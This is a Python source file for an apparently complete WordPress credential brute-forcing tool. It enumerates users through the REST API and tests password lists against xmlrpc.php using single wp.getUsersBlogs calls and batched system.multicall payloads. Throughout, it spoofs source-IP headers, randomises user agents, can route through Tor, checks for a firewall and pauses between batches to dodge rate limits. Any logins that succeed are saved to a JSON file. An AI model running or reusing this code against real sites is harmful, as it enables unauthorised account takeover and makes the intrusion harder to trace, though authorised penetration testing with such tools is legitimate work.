import asyncio
import json
import logging
import os
import random
import re
import time
from urllib.parse import urlparse
import xml.etree.ElementTree as ET

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType
from colorama import Fore, init
from termcolor import colored
import urllib3

import banner
from header_data import user_agents, referer_domains

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

SUCCESS_LOG = "successful_logins.json"  # to save the user:pass successful combos
WAF_DETECTED_LOG = "waf_detected.log"

# Set up logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)

# ==================================================================================================

def print_colored_bold(text, color=Fore.GREEN):
    print(colored(text, color, attrs=["bold"]))

# ==================================================================================================

def generate_random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# ==================================================================================================
# ==================================================================================================

def generate_random_headers(target_url):
    parsed_url = urlparse(target_url)
    if parsed_url.scheme and parsed_url.netloc:
        referer_domains.append(f"{parsed_url.scheme}://{parsed_url.netloc}")

    headers = {
        "Content-Type": "text/xml",
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "X-Forwarded-For": generate_random_ip(),
        "X-Real-IP": generate_random_ip(),
        "Referer": random.choice(referer_domains),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.7"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "br"]),
        "X-Client-IP": generate_random_ip(),
        "CF-Connecting-IP": generate_random_ip(),
        "True-Client-IP": generate_random_ip(),
        "Forwarded": f"for={generate_random_ip()};proto=https",
        "DNT": random.choice(["1", "0"]),  # Do Not Track
    }
    if random.choice([True, False]):
        headers["Origin"] = random.choice(referer_domains)
    if random.choice([True, False]):
        headers["Cache-Control"] = random.choice(["no-cache", "max-age=0", "no-store"])

    return headers

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def check_xmlrpc_available(url, session, retries=3, delay=2):
    headers = generate_random_headers(url)

    # Define different payload variations
    payload_variations = [
        """
        <methodCall>
          <methodName>system.listMethods</methodName>
          <params></params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.getCapabilities</methodName>
          <params></params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.methodHelp</methodName>
          <params>
            <param>
              <value><string>system.listMethods</string></value>
            </param>
          </params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.methodSignature</methodName>
          <params>
            <param>
              <value><string>system.listMethods</string></value>
            </param>
          </params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.methodSignature</methodName>
          <params>
            <param>
              <value><string>system.getCapabilities</string></value>
            </param>
          </params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.methodSignature</methodName>
          <params>
            <param>
              <value><string>system.methodHelp</string></value>
            </param>
          </params>
        </methodCall>
        """,
        """
        <methodCall>
          <methodName>system.multicall</methodName>
          <params>
            <param>
              <value>
                <array>
                  <data>
                    <value>
                      <struct>
                        <member>
                          <name>methodName</name>
                          <value><string>system.listMethods</string></value>
                        </member>
                      </struct>
                    </value>
                    <value>
                      <struct>
                        <member>
                          <name>methodName</name>
                          <value><string>system.getCapabilities</string></value>
                        </member>
                      </struct>
                    </value>
                  </data>
                </array>
              </value>
            </param>
          </params>
        </methodCall>
        """
    ]

    for attempt in range(retries):
        try:
            # Randomly select a payload variation
            data = random.choice(payload_variations)

            async with session.post(url, headers=headers, data=data, timeout=30, ssl=False) as response:
                logging.info(f"Attempt {attempt + 1}: Checking XML-RPC at {url}, Status Code: {response.status}")
                if response.status == 200:
                    return True
                elif response.status == 429:  # Too Many Requests
                    retry_after = response.headers.get("Retry-After")
                    if retry_after:
                        logging.warning(f"Rate limited. Retrying after {retry_after} seconds.")
                        await asyncio.sleep(int(retry_after))
                    else:
                        logging.warning("Rate limited. Retrying after default delay.")
                        await asyncio.sleep(delay)
                else:
                    response_body = await response.text()
                    logging.error(f"XML-RPC check failed at {url}. Response body: {response_body}")
                    if "405" in response_body or response.status == 405:
                        logging.warning("Method Not Allowed - Server might be blocking the request method.")
                    return False
        except asyncio.TimeoutError:
            logging.error(f"Timeout occurred while checking XML-RPC for {url} on attempt {attempt + 1}")
        except aiohttp.ClientError as e:
            logging.error(f"Error checking XML-RPC on attempt {attempt + 1}: {e}")

        # Wait before retrying
        await asyncio.sleep(delay)

    return False

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def get_wp_users(url, session):
    """Using the REST API, detect usernames which have made a public post in WordPress instance"""
    headers = generate_random_headers(url)
    rest_api_url = await detect_rest_api_route(url, session)
    if rest_api_url is None:
        logging.error('No REST API detected. Cannot fetch users')
    else:
        users_api_url = rest_api_url + "wp/v2/users"
        try:
            async with session.get(users_api_url, headers=headers, ssl=False) as response:
                if response.status == 200:
                    users = [user["slug"] for user in await response.json()]
                    return users

            logging.error(
                "Failed to fetch users. Version likely <4.7, before users endpoint was added."
                "\nStatus code: %s", response.status
                )
        except aiohttp.ClientError as e:
            logging.error("Error fetching users: %s", e)
    return []

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def brute_force_login(url, username, password, session):
    headers = generate_random_headers(url)
    # Payload variation
    if random.choice([True, False]):
        data = f"""
            <methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>
           """
    else:
        data = f"""
          <methodCall>
              <methodName>wp.getUsersBlogs</methodName>
              <params>
                  <param><value><string>{username}</string></value></param>
                  <param><value><string>{password}</string></value></param>
              </params>
          </methodCall>
          """
    try:
        start_time = time.time()
        async with session.post(url, data=data, headers=headers, ssl=False) as response:
            response_time = time.time() - start_time
            response_text = await response.text()
            return response_text, response_time, response.status
    except aiohttp.ClientError as e:
        logging.error("ClientError during login attempt for %s:%s: %s", username, password, e)
        raise e
    except asyncio.TimeoutError as te:
        logging.error("TimeoutError during login attempt for %s:%s: %s", username, password, e)
        raise te


# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def detect_rest_api_route(url, session):
    """Function detecting WP-API REST route from /xmlrpc.php?rsd"""
    headers = generate_random_headers(url)
    async with session.get(url + '/xmlrpc.php?rsd', headers=headers, ssl=False) as resp:
        response_text = await resp.text()
        xmlroot = ET.fromstring(response_text.strip())
        rest_api = xmlroot.find('.//{*}api[@name="WP-API"]')
        if rest_api is not None:
            logging.warning("WP-API REST endpoint detected - host is version 4.4 or later")
            return rest_api.get('apiLink')

        return None

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def exploit_multicall(url: str,
                            user_pass_list: list[list[str, str]],
                            session: aiohttp.ClientSession):
    """
    Given a list of [username, password] lists, exploit the multicall method at the given url
    using the given session. Return the reponse_text, response_time, and response_status
    """
    headers = generate_random_headers(url)
    method_calls = ""
    for [username, password] in user_pass_list:
        # Payload variation
        if random.choice([True, False]):
            method_calls += f"""
            <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{username}</string></value><value><string>{password}</string></value></data></array></value></data></array></value></member></struct></value>
             """
        else:
            method_calls += f"""
            <value>
                <struct>
                    <member>
                        <name>methodName</name>
                        <value>
                            <string>wp.getUsersBlogs</string>
                        </value>
                    </member>
                    <member>
                        <name>params</name>
                        <value>
                            <array>
                                <data>
                                    <value>
                                        <array>
                                            <data>
                                                <value>
                                                    <string>{username}</string>
                                                </value>
                                                <value>
                                                    <string>{password}</string>
                                                </value>
                                            </data>
                                        </array>
                                    </value>
                                </data>
                            </array>
                        </value>
                    </member>
                </struct>
            </value>
            """

    data = f"""
        <methodCall>
            <methodName>system.multicall</methodName>
            <params>
                <param>
                    <value>
                        <array>
                            <data>
                               {method_calls}
                            </data>
                        </array>
                    </value>
                </param>
            </params>
        </methodCall>
    """

    try:
        start_time = time.time()
        async with session.post(url, data=data, headers=headers, ssl=False) as response:
            response_time = time.time() - start_time
            response_text = await response.text()
            return response_text, response_time, response.status
    except aiohttp.ClientError as e:
        logging.error(f"Error during multicall attempt: {e}")
        return None, None, None

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def analyze_response_times(response_times):
    """
    Analyze the response times to detect potential timing attacks.

    This function calculates the average and median response times from a list of response times.
    It also identifies the response with the maximum deviation from the average time, which could
    indicate a timing attack.
    """
    if response_times:
        # Calculate average response time
        average_time = sum(response_times) / len(response_times)

        # Calculate median response time
        sorted_times = sorted(response_times)
        median_time = (
            sorted_times[len(sorted_times) // 2]
            if len(sorted_times) % 2 != 0
            else (
                sorted_times[len(sorted_times) // 2 - 1]
                + sorted_times[len(sorted_times) // 2]
            )
            / 2
        )

        # Log the average and median response times
        logging.info(f"Average Response Time: {average_time:.4f} seconds")
        logging.info(f"Median Response Time: {median_time:.4f} seconds")

        # Detect significant time variations
        time_deviations = [abs(time - average_time) for time in response_times]
        max_deviation_index = time_deviations.index(max(time_deviations))
        logging.info(
            f"Max deviation detected at response: {max_deviation_index+1}, time: {response_times[max_deviation_index]:.4f}"
        )

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def save_successful_login(username, password):
    try:
        if os.path.exists(SUCCESS_LOG):
            with open(SUCCESS_LOG, "r") as f:
                successful_logins = json.load(f)
        else:
            successful_logins = []
        successful_logins.append({"username": username, "password": password})
        with open(SUCCESS_LOG, "w") as f:
            json.dump(successful_logins, f, indent=4)
    except Exception as e:
        logging.error(
            f"Error while writing successful login {username}:{password}: {e}"
        )

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def brute_force_task(url, username, password, session):
    """Function attempts brute_force_login and logs successful results"""
    response_text, response_time, response_status = await brute_force_login(
        url, username, password, session
    )
    # Not sure if Dashboard actually is a valid match, but trusting pre-existing
    # check which might work with older versions
    good_matches = ['isAdmin', 'Dashboard']
    if any(response_text is not None and match in response_text for match in good_matches):
        print_colored_bold(
                f"\nLogin successful with {username}:{password} -- adding to {SUCCESS_LOG}",
                color='green')
        await save_successful_login(username, password)
        return True

    return False

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

def print_multicall_progress(start, matches, misses, completed, total, end=''):
    """Output a blue multicall progress line with the supplied statistics"""
    matches_str = f"{Fore.GREEN}{matches}{Fore.CYAN}" if matches > 0 else f"{matches}"
    misses_str = f"{Fore.RED}{misses}{Fore.CYAN}" if misses > 0 else f"{misses}"
    elapsed = time.perf_counter() - start
    minutes, seconds = divmod(int(elapsed), 60)
    print(
        f"\r{Fore.CYAN}Username/Password Combinations Checked: {completed}/{total} "
        f"(Matches|Misses: {matches_str}|{misses_str}) | "
        f"Elapsed: {minutes:02}:{seconds:02}",
        end=end)

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def progress_print(tasks: list[asyncio.Task], total: int):
    """Print progress while brute force attempts are executing"""
    start = time.perf_counter()
    while True:
        done = sum(1 for t in tasks if t.done())
        complete = sum(1 for t in tasks if t.done() and not t.cancelled() and t.exception() is None)
        exceptions = sum(1 for t in tasks if t.done() and t.exception() is not None)
        exceptions_str = f"{Fore.RED}{exceptions}{Fore.CYAN}" if exceptions > 0 else f"{exceptions}"
        elapsed = time.perf_counter() - start
        minutes, seconds = divmod(int(elapsed), 60)
        attempts_per_second = int(done / elapsed) if elapsed > 0 else 0
        print(
            f"\r{Fore.CYAN}Username/Password Combinations Checked: {done}/{total} "
            f"(Complete|Exceptions: {complete}|{exceptions_str}) | "
            f"Elapsed: {minutes:02}:{seconds:02} | Attempts/second: {attempts_per_second}",
            end='')
        if done >= total:
            break
        await asyncio.sleep(1)

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def start_bruteforce_async(url, usernames, passwords, use_tor=False):
    """Build the asyncio task list of brute_force_tasks and then run them"""

    # Set up the proxy connector if using Tor
    if use_tor:
        # Parse the Tor proxy URL
        parsed_url = urlparse("socks5://127.0.0.1:9050")
        # Create a ProxyConnector for SOCKS5 proxy
        connector = ProxyConnector(
            proxy_type=ProxyType.SOCKS5,
            host=parsed_url.hostname,
            port=parsed_url.port,
        )
    else:
        connector = None  # No proxy connector if not using Tor

    # Create an aiohttp session with the connector
    async with aiohttp.ClientSession(connector=connector) as session:
        brute_force_coros = []  # Using coroutines so work doesn't immediately start

        # Create brute force coroutines for each username and password combination
        for username in usernames:
            for password in passwords:
                # Create an asyncio coroutine for each username-password pair
                brute_force_coros.append(
                    brute_force_task(
                        url,
                        username,
                        password,
                        session
                    )
                )

        tasks = []  # List of all the asyncio tasks for progress checking
        monitor = asyncio.create_task(progress_print(tasks, len(brute_force_coros)))

        # Chunk coroutines into a random number which should be small enough for XMLRPC to handle.
        # TIME is the real issue - at almost exactly 5 minutes, everything consistently throws
        # TimeoutErrors, but it was easier to deal with chunks of work then pausing based on time.
        chunked_coros = []
        min_chunk, max_chunk = 900, 1100
        bfc_idx = 0
        while bfc_idx < len(brute_force_coros):
            chunk_size = random.randint(min_chunk, max_chunk)
            chunked_coros.append(brute_force_coros[bfc_idx:bfc_idx+chunk_size])
            bfc_idx += chunk_size

        try:
            chunk_count = len(chunked_coros)
            print_colored_bold(
                    f"Starting {chunk_count} brute force attempts in random sized batches (~1000) "
                    'with 15-30 second sleeps in between batches!',
                    color="yellow")
            for chunk_idx in range(chunk_count):
                chunk = chunked_coros[chunk_idx]
                # Tasks created separately so we can track progress
                chunked_tasks = [asyncio.create_task(c) for c in chunk]
                tasks.extend(chunked_tasks)
                # Wait for all tasks to complete
                await asyncio.gather(*chunked_tasks, return_exceptions=True)
                # sleep only if not last chunk
                if chunk_idx < len(chunked_coros) - 1:
                    await asyncio.sleep(random.randint(15, 30))

        finally:
            await monitor

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def start_multicall_async(url, usernames, passwords, session):
    """
    Execute multicall POSTs, in batches with sleeps (if necessary), output progress after each
    batch, and save successful logins.
    """
    # Build a list of all user/pass combos
    all_user_pass_combos = [[u, p] for u in usernames for p in passwords]
    total_user_pass_combos = len(all_user_pass_combos)

    # Chunk method_calls into a random number which should be small enough for XMLRPC to handle.
    # MEMORY is the real issue: "Allowed memory size of 134217728 exhausted", but testing showed
    # up to 1600 method calls to be "safe". Not wanting to accidentally cut something in half, I
    # opted to parse on username/pass and round way down to around 1400 per request.
    chunked_user_pass = []
    min_chunk, max_chunk = 1300, 1500
    if total_user_pass_combos > max_chunk:
        up_idx = 0
        while up_idx < total_user_pass_combos:
            chunk_size = random.randint(min_chunk, max_chunk)
            chunked_user_pass.append(all_user_pass_combos[up_idx:up_idx+chunk_size])
            up_idx += chunk_size
    else:
        chunked_user_pass.append(all_user_pass_combos)

    chunk_count = len(chunked_user_pass)
    print_colored_bold(
            f"Starting {chunk_count} multicall POSTs in random sized batches (~1400) with random "
            '15-30 second sleep in between POSTs',
            color='yellow')
    start = time.perf_counter()
    response_times = []
    done, total_matches, total_misses = 0, 0, 0
    for chunk_idx in range(chunk_count):
        chunk = chunked_user_pass[chunk_idx]
        chunk_size = len(chunk)
        chunk_matches = 0
        print_multicall_progress(start, total_matches, total_misses, done, total_user_pass_combos)

        # Attempt to exploit the multicall method
        response_text, response_time, _ = await exploit_multicall(url, chunk, session)
        response_times.append(response_time)

        if response_text:
            # Extremely useful for debugging, else too noisy
            #print(f"\n{Fore.GREEN}Multicall response {response_status}: {response_text[:500]}...")

            # Analyze the response, look for any successes
            # Not sure where the Dashboard comes from, in our testing 'isAdmin' was
            # the good match. But I figure this might go with older versions, so
            # until I can determine otherwise, I will leave it
            if "Dashboard" in response_text:
                for [username, password] in chunk:
                    if (
                        f"<string>{username}</string>" in response_text
                        and f"<string>{password}</string>" in response_text
                    ):
                        chunk_matches += 1
                        print(
                            f"\n{Fore.GREEN}Multicall login successful with {username}:{password}"
                        )
                        await save_successful_login(username, password)

            if 'isAdmin' in response_text:
                # Convert response_text to XML for XPathing
                xmlroot = ET.fromstring(response_text.strip())
                xml_names = xmlroot.findall('.//value/struct/member/name')

                # Working and not working responses have different XML structures,
                # which results in our xpath returning more than one per attempt.
                # This narrows down xml_names to one per attempt (compare_matches).
                # isAdmin == working, faultCode == not working
                targetted_names = ['isAdmin', 'faultCode']
                compare_matches = [e.text for e in xml_names if e.text in targetted_names]

                # If one of the matches is 'isAdmin', save off its index
                matching_indices = [i for i, v in enumerate(compare_matches) if v == 'isAdmin']
                chunk_matches = len(matching_indices)

                # Save the user_pass combos which correspond to a good index, then
                # save to successful logins file
                good_user_pass_combos = list(map(chunk.__getitem__, matching_indices))
                for [username, password] in good_user_pass_combos:
                    print_colored_bold(
                            f"\nMulticall login successful with {username}:{password} -- "
                            f"adding to {SUCCESS_LOG}", color='green')
                    await save_successful_login(username, password)

        total_matches += chunk_matches
        total_misses += chunk_size - chunk_matches
        done += chunk_size
        # sleep only if not last chunk, else print a final progress
        if chunk_idx < len(chunked_user_pass) - 1:
            await asyncio.sleep(random.randint(15, 30))
        else:
            print_multicall_progress(start,
                                     total_matches,
                                     total_misses,
                                     done,
                                     total_user_pass_combos,
                                     "\n")

    return response_times

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def check_for_waf(url, session, use_tor=False):
    try:
        # Define headers for the request
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
        }
        # Send a GET request to the URL
        async with session.get(url, headers=headers, timeout=15, ssl=False) as response:
            if response.status == 403:
                logging.warning(f"WAF Detected with status {response.status} for {url}")
                with open(WAF_DETECTED_LOG, "a") as f:
                    f.write(f"WAF Detected with status {response.status} for {url}\n")
                return True
            return False

    except aiohttp.ClientError as e:
        logging.error(f"Error when testing for WAF : {e}")
        return False

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

def detect_xml_chars(data_list: list):
    """
    Given a list, separate out entries which have xml characters: < > & " '
    and return a List of good entries and a Set of bad entries.
    Due to the use of Sets during processing, all entries are de-duped
    """
    pattern = re.compile(r'[<>&"\']')
    good_entries, bad_entries = set(), set()  # Using set to take advantage of dedupe
    for item in data_list:
        if pattern.findall(item):
            bad_entries.add(item)
        else:
            good_entries.add(item)

    # Using a list cuz we want ordered during processing
    return list(good_entries), bad_entries

# ==================================================================================================
# ==================================================================================================
# ==================================================================================================

async def main():
    # Print the banner
    banner.print_banner()
    # Get the target URL from the user
    url = input(
        f"{Fore.YELLOW}Enter the target WordPress website URL (e.g., https://example.com): "
    )
    # Ask the user if they want to use Tor
    use_tor = input(f"{Fore.YELLOW}Do you want to use Tor? (y/n): ").lower() == "y"
    if use_tor:
        print_colored_bold('Using Tor to anonymize the requests', color="yellow")

    # Set up the proxy connector if using Tor
    if use_tor:
        parsed_url = urlparse("socks5://127.0.0.1:9050")
        connector = ProxyConnector(
            proxy_type=ProxyType.SOCKS5,
            host=parsed_url.hostname,
            port=parsed_url.port,
        )
    else:
        connector = None

    # Create an aiohttp session with the connector
    async with aiohttp.ClientSession(connector=connector) as session:

        # Check for WAF detection
        waf_detected = await check_for_waf(url, session)
        if waf_detected:
            print(f"{Fore.YELLOW}WAF detected, proceed with caution")

        # Check if xmlrpc.php is available
        if await check_xmlrpc_available(url + "/xmlrpc.php", session):
            print_colored_bold('xmlrpc.php is available, proceeding!', color="green")
        else:
            print(f"{Fore.RED}xmlrpc.php is not available. Exiting...")
            return

        # Ask the user if they want to list users from WP REST API
        use_wp_api = input(
            f"{Fore.YELLOW}Do you want to list users from WordPress REST API? (y/n): "
        ).lower()

        users = []
        rest_api_used = False
        if use_wp_api == "y":
            users = await get_wp_users(url, session)
            if users:
                rest_api_used = True
                print(f"{Fore.CYAN}Found users: {', '.join(users)}")
            else:
                print(f"{Fore.RED}No users found from WP API.")

        if not users:
            # Ask the user if they want to provide a username file or enter manually
            username_choice = input(
                f"{Fore.YELLOW}Do you want to provide a username file or enter manually? (f/m): "
            ).lower()
            if username_choice == "f":
                username_file = input(f"{Fore.YELLOW}Enter the path to the username file: ")
                if os.path.exists(username_file):
                    with open(username_file, "r", encoding='utf-8') as file:
                        users = [line.strip() for line in file.readlines()]
                        users, bad_users = detect_xml_chars(users)
                        if bad_users:
                            print(
                                f"{Fore.RED}The following users have xml chars and will "
                                f"be skipped: {bad_users}")
            else:
                users = [input(f"{Fore.YELLOW}Enter a username: ").strip()]

        # Ask the user if they want to provide a password file or use default
        password_choice = input(
            f"{Fore.YELLOW}Do you want to provide a password file or use default (wppass.txt)? (f/d): "
        ).lower()

        password_file = 'wppass.txt'
        if password_choice == "f":
            password_file = input(f"{Fore.YELLOW}Enter the path to the password file: ")

        passwords = []
        if os.path.exists(password_file):
            with open(password_file, "r", encoding='utf-8') as file:
                passwords = [line.strip() for line in file.readlines()]

            passwords, bad_passwords = detect_xml_chars(passwords)
            if bad_passwords:
                print(
                    f"{Fore.RED}The following passwords have xml chars and will "
                    f"be skipped: {bad_passwords}")
        else:
            print(f"{Fore.RED}Password file {password_file} not found. Exiting...")
            return

        # Ask the user if they want to use system.multicall, if we haven't already
        # detected and used the REST API. Unrelated to the REST API itself, multicall
        # won't work on versions of WordPress which have REST Infrastructure (>=4.4)
        rest_api_multicall_warning = (
            f"{Fore.RED}REST API detected: Skipping multicall prompt because system.multicall was "
            "modified in versions >=4.4\nto invalidate all calls after an invalid one was "
            "detected. Continue to try brute force method."
        )
        if rest_api_used:
            print(rest_api_multicall_warning)
        else:
            multicall_choice = input(
                f"{Fore.YELLOW}Do you want to use system.multicall? (y/n): "
            ).lower()

            if multicall_choice == "y":
                rest_api_route = await detect_rest_api_route(url, session)
                if rest_api_route is not None:
                    print(rest_api_multicall_warning)
                else:
                    response_times = await start_multicall_async(
                        url + "/xmlrpc.php", users, passwords, session
                    )
                    logging.info("Analyzing response times")
                    await analyze_response_times(response_times)
                    return

        # Always confirm user wants to brute force - it's noisy
        brute_force_choice = input(
            f"{Fore.YELLOW}Do you want to try brute force method? (y/n): "
        ).lower()
        if brute_force_choice == "y":
            await start_bruteforce_async(url + "/xmlrpc.php", users, passwords)

# ==================================================================================================
# ==================================================================================================

if __name__ == "__main__":
    asyncio.run(main())
